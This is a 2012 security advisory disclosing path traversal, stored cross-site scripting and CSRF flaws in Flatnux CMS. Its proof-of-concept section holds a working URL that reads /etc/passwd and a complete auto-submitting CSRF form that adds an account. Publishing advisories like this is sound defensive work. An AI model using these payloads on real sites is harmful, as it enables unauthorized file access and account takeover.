Title:
======
Flatnux CMS 2011 08.09.2 - Multiple Web Vulnerabilities


Date:
=====
2012-04-01


References:
===========
http://www.vulnerability-lab.com/get_content.php?id=487


VL-ID:
=====
487


Introduction:
=============
Flatnux is no database CMS for accessible websites, corporate websites, e-commerce and web management.
Flatnux is a CMS without database that may have a database.
CMS a program that allows you to easily create and update a website.
Flatnux is a cms easy to use that can be used for:

     accessible portals
     E-commerce and shopping online
     web management
     Multilingual Websites
     Websites for Mobile Devices

Example of e-commerce carried out with flatnux (www.pesto-genovese.it/)
Example of management web made &#8203;&#8203;with flatnux
Example website created with flatnux, with online catalog
Example of a web portal interface for mobile devices

(Copy of the Vendor Homepage: http://www.flatnux.altervista.org/news.html )


Abstract:
=========
A Vulnerability Laboratory Researcher discovered multiple Web Vulnerabilities in Flatnux CMS 2011 08.09.2.


Report-Timeline:
================
2012-04-01:	Public or Non-Public Disclosure


Status:
========
Published


Exploitation-Technique:
=======================
Remote


Severity:
=========
High


Details:
========
1.1
A arbitrary file traversal vulnerability is detected in Flatnux CMS 2011 08.09.2.
The vulnerability allows an admin of the cms system to access server file components.
Successful exploitation leads to unauthorized execution and access to system files 
which expands the web server rights of a restricted user.

Vulnerable Module(s):
				[+] controlcenter.php > opt=contents/Files&dir=


1.2
A persistent input validation vulnerabilities are detected in Flatnux CMS 2011 08.09.2.
The bugs allow remote attackers to implement/inject malicious script code on the application side (persistent).
Successful exploitation of the vulnerability can lead to session hijacking (manager/admin) or stable (persistent) 
context manipulation. Exploitation requires low user inter action.

Vulnerable Module(s):
				[+] Comment News - Title News > Name of Folders in Gallery


1.3
A cross site request forgery vulnerability is detected in Flatnux CMS 2011 08.09.2. The bugs allow remote 
attackers with high required user inter action to edit user accounts. Successful exploitation can lead to account access.
To exploit the issue the attacker need to create a manipulated copy the edit user mask/form. Inside of the document the 
remote can implement his own values for the update because of no form or token protection. When admin get now forced to 
execute the script via link he is executing the new value on the update of the application if his session is not expired.


Vulnerable Module(s):
				[+] xdb_fn_users - Add Account

Affected Version(s):
				[+] flatnux-2011-08.09.2
				[+] flatnux-2011-2012-01.03.3
				[+] flatnux-2011-minimal-2012-01.03.3
				[+] fncommerce-2010-08-09-no-db
				[+] fncommerce-2010-08-09-no-sample-data
				[+] fncommerce-2010-08-09-with-sample-data
				[+] fncommerce-2010-12-17-no-db
				[+] fncommerce-2010-12-17-no-sample-data
				[+] fncommerce-2010-12-17-with-sample-data


Proof of Concept:
=================
The vulnerabilities can be exploit with low, medium and high required user inter action.
For demonstration or reproduce ...


1.1
http://127.0.0.1/flatnux/controlcenter.php?opt=contents/Files&dir=%2Fetc&ffile=passwd&opmod=open


1.2
     the comment to the news
     the title of the news
     the name of the folders that admin creates in the gallery


1.3
<html>
<form  name="test" action="http://127.0.1.1/flatnux/controlcenter.php?page___xdb_fn_users=1&order___xdb_fn_users=username&desc___xdb_fn_users=&op___xdb_fn_users=insnew&page___
xdb_fn_users=&op=editdata&opt=utilities/xmldb_admin&t=fn_users" method="post">
<input type="hidden" name="username" value="csrf"><br/>
<input type="hidden" name="email" value="csrf@hotmail.com"><br/>
<input type="hidden" name="passwd" value="186911"><br/>
<input type="hidden" name="passwd_retype" value="186911"><br/>
<input type="hidden" name="name" value="csrf"><br/>
<input type="hidden" name="surname" value="Mr"><br/>
<input type="hidden" name="link" value="http"><br/>
<input type="hidden" name="avatarimage" value=""><br/>
<input type="hidden" name="avatar" value=""><br/>
<input type="hidden" name="save___xdb_fn_users" value="__xdb_fn_users"><br\>
<input type="hidden" name="activ" value=1><br/>
</form>
<script>document.test.submit();</script>
</html>


Risk:
=====
1.1
The security risk of the arbitrary file traversal vulnerability is estimated as high(-).

1.2
The security risk of the persistent input validation vulnerability is estimated as medium.

1.3
The security risk of the cross site request forgery vulnerability is estimated as low(+).


Credits:
========
Vulnerability Laboratory [Research Team]   -    the_storm (the_storm@vulnerability-lab.com)


Disclaimer:
===========
The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
may not apply. Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability-
Lab. Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of 
other media, are reserved by Vulnerability-Lab or its suppliers.

    						Copyright © 2012 Vulnerability-Lab

-- 
VULNERABILITY RESEARCH LABORATORY TEAM
Website: www.vulnerability-lab.com
Mail: research@vulnerability-lab.com

